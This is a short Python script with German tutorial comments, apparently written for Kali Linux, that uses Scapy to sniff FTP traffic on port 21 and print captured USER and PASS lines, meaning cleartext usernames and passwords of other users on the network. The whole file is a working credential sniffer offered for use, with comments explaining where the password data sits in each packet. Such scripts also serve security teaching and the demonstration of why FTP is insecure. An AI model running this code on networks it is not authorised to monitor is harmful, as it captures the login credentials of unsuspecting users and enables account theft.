#!/usr/bin/python3

# Skript für Kali Linux Use (geht auch unter Windows)
# Dieses Skript gilt eigentlich nur für FTP Sniffing unter IPv4 und NICHT unter IPv6
from scapy.all import *

def on_packet(paket):

    '''Folgende Auflistungen sind möglich'''
    #print(paket) # Rohdaten anzeigen
    #print(paket.summary()) # Kurzinformationen
    #paket.show() # Paketinformationen aufgelistet: Ethernet[IP, TCP, Raw]  -> Raw Ebene ist für uns interessant, diese beinhaltet die PW Informationen

    if "Raw" in paket:
        #paket["Raw"].show() # Wenn Raw-Data vorhanden, dann anzeigen
        #print(paket["Raw"].load) # Wenn Payload in Raw-Data vorhanden, dann anzeigen
        contents = str(paket["Raw"].load, encoding ="utf-8") # Umwandlung der Payload in String (damit kann in Python besser gearbeitet werden)

        if contents.startswith("PASS") or contents.startswith("USER"):
            print(contents)

interface = "eth0" # Unter Kali Linux:>> ifconfig -a
filter = "tcp and port 21" # FTP verwendet TCP Protokoll, FTP verwendet Port 21. Änderungen könnte wie folgt aussehen "udp and port 88"

# Snifffunktion von Scapy
# prn: Wenn auf interface, das gefilterte gefunden wird dann führe prn Funktion aus!
# store = 0 -> Informationen nur weiterreichen nicht intern speichern
sniff(iface=interface, filter=filter, prn=on_packet, store=0)

